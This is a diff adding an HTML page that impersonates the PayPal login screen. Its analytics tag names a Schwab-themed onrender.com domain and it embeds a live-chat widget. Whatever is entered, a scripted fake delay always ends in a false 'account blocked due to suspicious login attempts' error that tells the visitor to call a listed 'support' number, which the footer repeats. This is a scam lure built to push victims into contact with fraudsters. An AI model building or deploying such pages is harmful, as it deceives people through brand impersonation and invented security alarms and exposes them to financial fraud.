@@ -1,0 +1,119 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>PayPal</title>
+    <link href="css/stylesheet.css" rel="stylesheet" type="text/css" />
+    <link rel="icon" type="image/x-icon" href="favicon-57.png" sizes="32x32">
+    
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/62fc347337898912e96369f5/1gakipph0';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+
+
+    <script defer data-domain="charles24x7schwab-login.onrender.com" src="https://plausible.io/js/script.js"></script>
+<style>.error-message {
+            color: red;
+            margin-top:0px;
+            display: none; 
+            font-size: 16px;
+            line-height: 22px;
+            margin-bottom: 40px;
+
+        }
+
+        /* Styles for spinner inside the button */
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-left: 8px;
+            display: none; /* Initially hidden */
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+       <div class="container">
+        <form id="contact" method="post"> 
+            <div class="logo"><img src="paypal.png"/></div>           
+             <!-- <h2>Log in to PayPal</h2> -->
+              <div class="error-message" id="error-message">
+                Error code: 0X0047800 <br> Your account has been blocked due to some suspicious login attempts. <br>Contact Support : <a href="tel:+1 (888) 888-8888">+1 (888) 888-8888</a>
+            </div>
+
+            <fieldset>
+                <input placeholder="Email or mobile number" type="text" tabindex="2" required>
+            </fieldset>
+            
+            <fieldset>                
+              <input placeholder="Password" type="Password" tabindex="2" required>
+            </fieldset>
+            
+             <a class="forget" href="index.php"><h7>Forgot Password?</h7></a>
+
+             <button type="submit" id="loginButton">Log In
+                    <span class="loading-spinner" id="loadingSpinner"></span>
+                </button>
+
+            <p><a href="#"><img width="280" src="english1.jpg"></a></p>
+        </form>
+
+  </div>
+
+
+ <script>
+        document.getElementById("contact").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent form submission
+
+            // Show loading spinner
+            var loginButton = document.getElementById("loginButton");
+            var loadingSpinner = document.getElementById("loadingSpinner");
+            var errorMessage = document.getElementById("error-message");
+
+            loadingSpinner.style.display = "inline-block"; // Show spinner
+
+            // Hide the error message and reset any existing state
+            errorMessage.style.display = "none";
+
+            // Simulate a delay of 2-3 seconds (for example, waiting for server response)
+            setTimeout(function() {
+                loadingSpinner.style.display = "none"; // Hide spinner
+                errorMessage.style.display = "block"; // Show error message after 2-3 seconds
+            }, 2500); // 2.5 seconds delay for showing error message
+        });
+    </script>
+
+  <footer id="footer">
+    <div class="container">
+      <div class="row">
+        <div class="col-md-12">
+<a href="tel:+1 (888) 888-8888"><img src="phone.png"/>Support +1 (888) 888-8888</a>
+
+</div>
+</div>
+</footer>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+</body>
+</html>
